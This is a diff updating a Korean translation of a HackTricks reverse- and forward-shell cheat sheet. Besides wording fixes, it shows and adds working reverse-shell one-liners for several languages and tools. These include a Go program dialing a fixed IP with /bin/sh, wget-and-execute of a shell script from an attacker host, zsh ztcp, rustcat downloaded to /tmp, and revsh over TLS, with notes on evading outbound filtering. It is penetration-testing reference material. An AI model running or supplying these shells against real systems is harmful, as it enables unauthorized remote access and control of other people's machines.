@@ -2,7 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**이 쉘에 대해 질문이 있으면** [**https://explainshell.com/**](https://explainshell.com) **에서 확인할 수 있습니다.**
+**이 쉘에 대한 질문이 있으면** [**https://explainshell.com/**](https://explainshell.com) **에서 확인할 수 있습니다.**
 
 ## Full TTY
 
@@ -47,11 +47,11 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Linux 기반 웹 애플리케이션에서 **Remote Code Execution (RCE)** 취약점을 다룰 때, 리버스 셸을 얻는 것이 iptables 규칙이나 복잡한 패킷 필터링 메커니즘과 같은 네트워크 방어에 의해 방해받을 수 있습니다. 이러한 제한된 환경에서는 손상된 시스템과 보다 효과적으로 상호작용하기 위해 PTY (Pseudo Terminal) 셸을 설정하는 대안적 접근 방식이 있습니다.
+Linux 기반 웹 애플리케이션에서 **원격 코드 실행 (RCE)** 취약점을 다룰 때, 리버스 셸을 얻는 것은 iptables 규칙이나 복잡한 패킷 필터링 메커니즘과 같은 네트워크 방어에 의해 방해받을 수 있습니다. 이러한 제한된 환경에서는 손상된 시스템과 더 효과적으로 상호작용하기 위해 PTY (가상 터미널) 셸을 설정하는 대안적 접근 방식이 있습니다.
 
 이 목적을 위해 추천되는 도구는 [toboggan](https://github.com/n3rada/toboggan.git)으로, 이는 대상 환경과의 상호작용을 단순화합니다.
 
-toboggan을 효과적으로 사용하려면, 대상 시스템의 RCE 맥락에 맞춘 Python 모듈을 생성하십시오. 예를 들어, `nix.py`라는 모듈은 다음과 같이 구성될 수 있습니다:
+toboggan을 효과적으로 사용하려면, 대상 시스템의 RCE 맥락에 맞춘 Python 모듈을 생성해야 합니다. 예를 들어, `nix.py`라는 모듈은 다음과 같이 구성될 수 있습니다:
 ```python3
 import jwt
 import httpx
@@ -83,7 +83,7 @@ toboggan -m nix.py -i
 
 또 다른 가능성은 `IppSec` 포워드 셸 구현을 사용하는 것입니다 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
-다음 사항을 수정해야 합니다:
+다음 사항을 수정하기만 하면 됩니다:
 
 - 취약한 호스트의 URL
 - 페이로드의 접두사 및 접미사(있는 경우)
@@ -118,7 +118,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-명령을 보내려면 입력하고, Enter를 누르고, CTRL+D를 누릅니다 (STDIN을 중지하기 위해)
+명령을 보내려면 입력하고 Enter를 누른 다음 CTRL+D를 누릅니다 (STDIN을 중지하려면).
 
 **희생자**
 ```bash
@@ -165,7 +165,7 @@ p.waitFor()
 victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
 attacker> ncat -l <port,eg.443> --ssl
 ```
-## 고랭
+## Golang
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
@@ -219,6 +219,48 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (내장 TCP)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – Rust로 작성된 현대적인 netcat 유사 리스너 (2024년부터 Kali에 패키징됨).
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+특징:
+- 암호화된 전송을 위한 선택적 `--ssl` 플래그 (TLS 1.3)
+- 피해자에게 임의의 바이너리(예: `/bin/sh`, `python3`)를 생성하기 위한 `-s`
+- 완전한 대화형 PTY로 자동 업그레이드를 위한 `--up`
+
+## revsh (암호화 및 피벗 준비 완료)
+
+`revsh`는 **암호화된 Diffie-Hellman 터널**을 통해 전체 TTY를 제공하는 작은 C 클라이언트/서버이며, 선택적으로 **TUN/TAP** 인터페이스를 연결하여 리버스 VPN과 같은 피벗을 지원할 수 있습니다.
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+유용한 플래그:
+- `-b` : 리버스 대신 바인드 셸
+- `-p socks5://127.0.0.1:9050` : TOR/HTTP/SOCKS를 통한 프록시
+- `-t` : TUN 인터페이스 생성 (리버스 VPN)
+
+전체 세션이 암호화되고 다중화되기 때문에, 일반 텍스트 `/dev/tcp` 셸을 차단할 수 있는 간단한 아웃바운드 필터링을 종종 우회합니다.
+
 ## OpenSSL
 
 공격자 (Kali)
@@ -292,11 +334,11 @@ close(Service)
 ```
 ## Xterm
 
-이것은 포트 6001에서 귀하의 시스템에 연결을 시도할 것입니다:
+이것은 포트 6001에서 귀하의 시스템에 연결을 시도합니다:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-역방향 셸을 잡기 위해 사용할 수 있는 것은 (포트 6001에서 수신 대기합니다):
+역방향 셸을 잡기 위해 사용할 수 있는 것은 (포트 6001에서 수신 대기할 것입니다):
 ```bash
 # Authorize host
 xhost +targetip
@@ -305,18 +347,20 @@ Xnest :1
 ```
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 주의: Java 리버스 셸은 Groovy에서도 작동합니다.
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 주의: Java 리버스 셸은 Groovy에도 작동합니다.
 ```bash
 String host="localhost";
 int port=8044;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-## 참고 문헌
+## References
 
 - [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
